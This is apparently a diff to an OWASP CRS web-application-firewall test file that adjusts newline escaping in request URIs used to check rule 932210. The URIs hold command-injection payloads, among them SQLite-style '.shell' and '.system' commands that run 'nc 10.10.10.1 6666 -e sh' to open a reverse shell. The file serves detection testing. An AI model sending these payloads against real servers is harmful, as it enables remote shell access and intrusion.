@@ -17,7 +17,7 @@ tests:
               User-Agent: "OWASP CRS test agent"
             method: GET
             port: 80
-            uri: "/get?foo=;\n.shell%20nc%2010.10.10.1%206666%20-e%20sh\n"
+            uri: "/get?foo=;\\n.shell%20nc%2010.10.10.1%206666%20-e%20sh\\n"
             version: HTTP/1.0
           output:
             log_contains: id "932210"
@@ -33,7 +33,7 @@ tests:
               User-Agent: "OWASP CRS test agent"
             method: GET
             port: 80
-            uri: "/get?foo=%22;\n.%20shell%20nc%2010.10.10.1%206666%20-e%20sh\n"
+            uri: "/get?foo=%22;\\n.%20shell%20nc%2010.10.10.1%206666%20-e%20sh\\n"
             version: HTTP/1.0
           output:
             log_contains: id "932210"
@@ -49,7 +49,7 @@ tests:
               User-Agent: "OWASP CRS test agent"
             method: GET
             port: 80
-            uri: "/get?foo=;\n.system%20nc%2010.10.10.1%206666%20-e%20sh\n"
+            uri: "/get?foo=;\\n.system%20nc%2010.10.10.1%206666%20-e%20sh\\n"
             version: HTTP/1.0
           output:
             log_contains: id "932210"
@@ -65,7 +65,7 @@ tests:
               User-Agent: "OWASP CRS test agent"
             method: GET
             port: 80
-            uri: "/get?foo=;\n.databases"
+            uri: "/get?foo=;\\n.databases"
             version: HTTP/1.0
           output:
             log_contains: id "932210"
